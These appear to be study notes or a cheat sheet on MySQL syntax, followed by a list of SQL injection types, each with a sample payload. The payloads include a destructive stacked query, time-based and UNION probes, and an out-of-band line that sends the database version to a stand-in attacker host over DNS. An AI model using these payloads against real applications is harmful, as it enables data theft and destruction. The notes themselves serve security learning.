### Insert statement
`INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');`
(This will insert into logins table 2 rows with following values)

### Select statement
`SELECT column1, column2 FROM table_name;`
or
`SELECT * FROM table_name;`
(Select some columns or all from a specific Tablename)

### Drop statement
`DROP TABLE logins;`
(This will delete a whole table)

### Alter statement

```
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;
```
(Change proprieties on columns of a given table)

### Update statement
`UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`
(Update rows values based on specific conditions)

### Select filtering
`SELECT * FROM logins ORDER BY password DESC, id ASC;
(will sort by password in DESC and ID in ASC)`
or
`SELECT * FROM logins LIMIT 2;`
(Will show n. of rows)
or
`SELECT * FROM table_name WHERE <condition>;`
(Show rows matching only a condition)
or
`SELECT * FROM logins WHERE username LIKE 'admin%';`
(All rows matching Admin* where in SQL % == * nd  _ symbol is used to match exactly one character)

### Operators
`condition1 AND condition2`
(True/false returned if both match, you can use && instead )
or
`SELECT 1 = 1 OR 'test' = 'abc';`
(True/False returned if at-least one matches, you can use || instead)
or 
`SELECT NOT 1 = 1;`
(Converts a value to boolean, you can use ! instead)

### Operators extra(Executed by this order)
```
Division (/), Multiplication (*), and Modulus (%)
Addition (+) and subtraction (-)
Comparison (=, >, <, <=, >=, !=, LIKE)
NOT (!)
 AND (&&)
OR (||)
```


### SQL Query types
Boolean-based blind SQL Injection: **AND 1=1**
(Boolean-based blind SQL Injection vulnerabilities through the differentiation of TRUE from FALSE query results.)
TRUE results are generally based on responses having none or marginal difference to the regular server response.
FALSE results are based on responses having substantial differences from the regular server response.

Error-based SQL Injection: **AND GTID_SUBSET(@@version,0)**
(If the database management system (DBMS) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries.)

UNION query-based SQL Injection: **UNION ALL SELECT 1,@@version,3**
(With the usage of UNION, it is generally possible to extend the original (vulnerable) query with the injected statements' results.)

Stacked Queries: **; DROP TABLE users**
(Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one.)

Time-based blind SQL Injection: **AND 1=IF(2>1,SLEEP(5),0)**
(The principle of Time-based blind SQL Injection is similar to the Boolean-based blind SQL Injection, but here the response time is used as the source for the differentiation between TRUE or FALSE.)
    TRUE response is generally characterized by the noticeable difference in the response time compared to the regular server response
    FALSE response should result in a response time indistinguishable from regular response times
	
Inline Queries: **SELECT (SELECT @@version) from**
This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. 

Out-of-band SQL Injection: **LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))**
(This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). 
SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.)